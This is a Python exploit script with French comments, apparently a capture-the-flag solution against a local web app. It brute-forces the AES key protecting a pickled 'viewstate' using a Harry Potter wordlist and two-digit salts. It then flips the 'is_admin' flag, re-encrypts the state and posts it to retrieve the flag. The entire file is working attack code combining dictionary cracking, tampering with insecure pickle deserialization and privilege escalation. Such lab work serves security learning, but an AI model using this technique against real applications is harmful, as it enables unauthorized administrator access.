import requests, base64, pickle, os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes, padding
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from bs4 import BeautifulSoup
from tqdm import tqdm

URL = "http://127.0.0.1:5001/"
DICT_FILE = "harry-potter.txt"

# --- Fonctions AES CBC ---
def derive_key(secret: str, salt: bytes) -> bytes:
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100_000,
        backend=default_backend()
    )
    return kdf.derive(secret.encode())

def encrypt(data: bytes, key: bytes) -> str:
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(data) + padder.finalize()
    ct = encryptor.update(padded_data) + encryptor.finalize()
    return base64.b64encode(iv + ct).decode()

def decrypt(enc_data: str, key: bytes) -> bytes:
    raw = base64.b64decode(enc_data)
    iv, ct = raw[:16], raw[16:]
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    padded_data = decryptor.update(ct) + decryptor.finalize()
    unpadder = padding.PKCS7(128).unpadder()
    data = unpadder.update(padded_data) + unpadder.finalize()
    return data

# --- Étape 1 : récupérer le viewstate initial ---
resp = requests.get(URL)
soup = BeautifulSoup(resp.text, "html.parser")
viewstate = soup.find("input", {"name": "viewstate"})["value"]

# --- Étape 2 : double brute-force mot+salt ---
with open(DICT_FILE, "r", encoding="utf-8", errors="ignore") as f:
    words = [line.strip() for line in f if line.strip()]

found = False
for word in tqdm(words, desc="Password :"):
    for i in range(100):  # tous les salts possibles 00-99
        salt = f"{i:02}".encode()
        key = derive_key(word, salt)
        try:
            obj = pickle.loads(decrypt(viewstate, key))
            print(f"[+] clef trouvé : {word} | Salt trouvé : {salt.decode()}")
            obj["is_admin"] = True
            new_viewstate = encrypt(pickle.dumps(obj), key)
            resp2 = requests.post(URL, data={"viewstate": new_viewstate})
            if "FLAG" in resp2.text:
                print("[+] Flag récupéré :")
                print(resp2.text)
                found = True
                break
        except Exception:
            continue
    if found:
        break
